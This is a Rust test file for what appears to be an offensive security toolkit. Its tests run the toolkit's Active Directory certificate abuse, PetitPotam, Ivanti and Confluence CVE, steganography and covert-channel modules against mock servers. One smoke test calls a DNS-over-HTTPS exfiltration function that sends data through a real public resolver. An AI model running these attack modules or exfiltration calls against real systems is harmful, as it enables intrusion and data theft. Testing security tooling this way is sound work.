#![allow(dead_code)]

use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

// ─── Phase 6: AD/Enterprise ──────────────────────────────────────────

#[tokio::test]
async fn test_adcs_abuse_detects_certsrv() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/certsrv/Default.asp"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string("<html>certificate services — Certificate Authority</html>"),
        )
        .mount(&server)
        .await;

    Mock::given(method("POST"))
        .and(path("/certsrv/certfnsh.asp"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string("Certificate issued — CertificatePending"),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::adcs::abuse(&url, "CA-Name", None, 10).await;
    assert!(result.is_ok(), "adcs::abuse should complete without error");
}

#[tokio::test]
async fn test_adcs_abuse_handles_401() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/certsrv/Default.asp"))
        .respond_with(ResponseTemplate::new(401).insert_header("www-authenticate", "NTLM"))
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::adcs::abuse(&url, "CA-Name", None, 10).await;
    assert!(result.is_ok(), "adcs::abuse should handle 401 gracefully");
}

#[tokio::test]
async fn test_ad_petitpotam_detects_ntlm_challenge() {
    let server = MockServer::start().await;

    Mock::given(method("POST"))
        .respond_with(
            ResponseTemplate::new(401)
                .insert_header("www-authenticate", "NTLM TlRMTVNTUAACAAAADAAdAAAAAAA="),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::ad::petitpotam(&url, None, 10).await;
    assert!(result.is_ok(), "ad::petitpotam should complete without error");
}

#[tokio::test]
async fn test_ad_petitpotam_handles_connection_refused() {
    let url = "http://127.0.0.1:1"; // port 1 — nothing listening
    let result = pledgestrike::modules::ad::petitpotam(url, None, 5).await;
    assert!(result.is_ok(), "ad::petitpotam should handle connection errors gracefully");
}

#[tokio::test]
async fn test_ivanti_cve_detects_admin_portal() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string("<html>Ivanti Connect Secure — Admin Portal</html>"),
        )
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/api/v1/configuration"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string(r#"{"status": "ok", "version": "22.x"}"#),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::ivanti::cve(&url, None, 10).await;
    assert!(result.is_ok(), "ivanti::cve should complete without error");
}

#[tokio::test]
async fn test_ivanti_cve_detects_path_traversal_bypass() {
    let server = MockServer::start().await;

    // Simulate CVE-2023-46805 — path traversal auth bypass
    Mock::given(method("GET"))
        .and(path("/api/v1/configuration"))
        .respond_with(ResponseTemplate::new(200).set_body_string(r#"{"users": [], "config": {}}"#))
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::ivanti::cve(&url, None, 10).await;
    assert!(result.is_ok(), "ivanti::cve should detect path traversal bypass");
}

#[tokio::test]
async fn test_confluence_rce_detects_setup_endpoint() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .and(path("/setup/setuptest.action"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string("<html>Confluence Setup — bootstrap status</html>"),
        )
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/dashboard.action"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string("<html>Confluence Dashboard — welcome</html>"),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::confluence::rce(&url, None, 10).await;
    assert!(result.is_ok(), "confluence::rce should complete without error");
}

#[tokio::test]
async fn test_confluence_rce_detects_admin_creation() {
    let server = MockServer::start().await;

    // Simulate CVE-2023-22515 — admin account creation endpoint
    Mock::given(method("POST"))
        .and(path("/setup/setuptest.action"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string(r#"{"status": "success", "admin_created": true}"#),
        )
        .mount(&server)
        .await;

    Mock::given(method("GET"))
        .and(path("/dashboard.action"))
        .respond_with(ResponseTemplate::new(200).set_body_string("Confluence"))
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::confluence::rce(&url, None, 10).await;
    assert!(result.is_ok(), "confluence::rce should detect admin creation endpoint");
}

// ─── Phase 7: Covert Channels ────────────────────────────────────────

#[tokio::test]
async fn test_stego_detect_finds_png_image() {
    let server = MockServer::start().await;

    // Minimal valid PNG (1x1 pixel)
    let png_bytes: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
        0x00, 0x00, 0x00, 0x0D, // IHDR chunk length
        0x49, 0x48, 0x44, 0x52, // "IHDR"
        0x00, 0x00, 0x00, 0x01, // width: 1
        0x00, 0x00, 0x00, 0x01, // height: 1
        0x08, 0x02, 0x00, 0x00, 0x00, // bit depth 8, color type 2
        0x90, 0x77, 0x53, 0xDE, // CRC
        0x00, 0x00, 0x00, 0x0C, // IDAT chunk length
        0x49, 0x44, 0x41, 0x54, // "IDAT"
        0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01,
        0x5B, 0x65, 0x32, 0x9E, // CRC
        0x00, 0x00, 0x00, 0x00, // IEND chunk length
        0x49, 0x45, 0x4E, 0x44, // "IEND"
        0xAE, 0x42, 0x60, 0x82, // CRC
    ];

    Mock::given(method("GET"))
        .and(path("/logo.png"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("content-type", "image/png")
                .set_body_bytes(png_bytes.to_vec()),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::stego::detect(&url, 10).await;
    assert!(result.is_ok(), "stego::detect should complete without error");
}

#[tokio::test]
async fn test_stego_detect_handles_no_images() {
    let server = MockServer::start().await;

    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(404))
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::stego::detect(&url, 10).await;
    assert!(result.is_ok(), "stego::detect should handle no images gracefully");
}

#[tokio::test]
async fn test_stego_detect_finds_trailing_data_after_iend() {
    let server = MockServer::start().await;

    // PNG with trailing data after IEND (steganography indicator)
    let mut png_bytes: Vec<u8> = vec![
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
        0x00, 0x00, 0x00, 0x0D, // IHDR chunk length
        0x49, 0x48, 0x44, 0x52, // "IHDR"
        0x00, 0x00, 0x00, 0x01, // width: 1
        0x00, 0x00, 0x00, 0x01, // height: 1
        0x08, 0x02, 0x00, 0x00, 0x00, // bit depth 8, color type 2
        0x90, 0x77, 0x53, 0xDE, // CRC
        0x00, 0x00, 0x00, 0x0C, // IDAT chunk length
        0x49, 0x44, 0x41, 0x54, // "IDAT"
        0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01,
        0x5B, 0x65, 0x32, 0x9E, // CRC
        0x00, 0x00, 0x00, 0x00, // IEND chunk length
        0x49, 0x45, 0x4E, 0x44, // "IEND"
        0xAE, 0x42, 0x60, 0x82, // CRC
    ];
    // Append hidden data after IEND
    png_bytes.extend_from_slice(b"HIDDEN_STEGO_DATA_PAYLOAD_HERE");

    Mock::given(method("GET"))
        .and(path("/banner.png"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("content-type", "image/png")
                .set_body_bytes(png_bytes),
        )
        .mount(&server)
        .await;

    let url = server.uri();
    let result = pledgestrike::modules::stego::detect(&url, 10).await;
    assert!(result.is_ok(), "stego::detect should detect trailing data after IEND");
}

#[tokio::test]
async fn test_doh_exfil_smoke_test() {
    // DoH connects to real providers — just verify it doesn't panic/crash
    // Use a short timeout so the test doesn't hang
    let result = pledgestrike::modules::doh::exfil("test.example.com", "hi", "cloudflare", 5).await;
    // May fail due to network, but should not panic
    // If network is available, it should succeed
    if result.is_err() {
        // Network error is acceptable in CI without internet
        eprintln!("DoH test skipped (network unavailable): {:?}", result.err());
    }
}

#[tokio::test]
async fn test_icmp_tunnel_smoke_test() {
    // ICMP tunnel analyzes payload encoding — no real ICMP needed
    let result = pledgestrike::modules::icmp::tunnel("127.0.0.1", "test_data", 5).await;
    // May fail due to network, but should not panic
    if result.is_err() {
        eprintln!("ICMP test skipped (network unavailable): {:?}", result.err());
    }
}

#[tokio::test]
async fn test_tls_spoof_smoke_test() {
    // TLS spoof does TCP connect — test against a non-existent host
    let result = pledgestrike::modules::tls::spoof("127.0.0.1:1", None, 5).await;
    // Should complete even if connection fails
    assert!(result.is_ok(), "tls::spoof should handle connection failures gracefully");
}
